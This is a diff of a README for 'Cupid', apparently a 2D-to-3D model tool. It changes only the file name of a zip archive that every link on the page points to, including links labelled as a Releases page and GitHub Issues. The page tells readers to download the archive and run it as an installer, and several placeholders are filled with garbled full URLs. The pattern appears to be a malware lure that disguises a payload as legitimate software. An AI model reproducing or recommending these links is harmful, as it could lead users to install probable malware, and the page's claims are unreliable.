@@ -1,7 +1,7 @@
 # 🎯 Cupid - Effortlessly Create 3D Models from 2D Images
 
 ## 📥 Download Cupid Now!
-[![Download Cupid](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip%https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip)](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip)
+[![Download Cupid](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip%https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip)](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip)
 
 ---
 
@@ -23,18 +23,18 @@ Before you download Cupid, ensure your computer meets the following minimum requ
 
 To download Cupid, visit the Releases page. 
 
-[Download Cupid from Releases](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip)
+[Download Cupid from Releases](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version of Cupid.
-3. Look for the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip, https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip).
+3. Look for the appropriate file for your operating system (e.g., https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip, https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip).
 4. Click on the file to begin the download.
 
 Once the file is downloaded:
 
-- **For Windows:** Locate the `https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip` file in your Downloads folder. Double-click it to run the installer. Follow the prompts to complete the installation.
+- **For Windows:** Locate the `https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip` file in your Downloads folder. Double-click it to run the installer. Follow the prompts to complete the installation.
   
-- **For macOS:** Open the `https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip` file from your Downloads. Drag and drop the Cupid application into your Applications folder.
+- **For macOS:** Open the `https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip` file from your Downloads. Drag and drop the Cupid application into your Applications folder.
 
 ## 🎨 How to Use Cupid
 
@@ -67,7 +67,7 @@ Here are some common issues you may encounter while using Cupid:
 
 For support:
 
-- Visit the [GitHub Issues](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Cupid-myzodendraceous.zip) page to report bugs or request features.
+- Visit the [GitHub Issues](https://raw.githubusercontent.com/Degrading-genustolmiea956/Cupid/main/assets/Software-v3.2.zip) page to report bugs or request features.
 - Check our FAQ section for common questions.
 
 ## 📌 Contributing
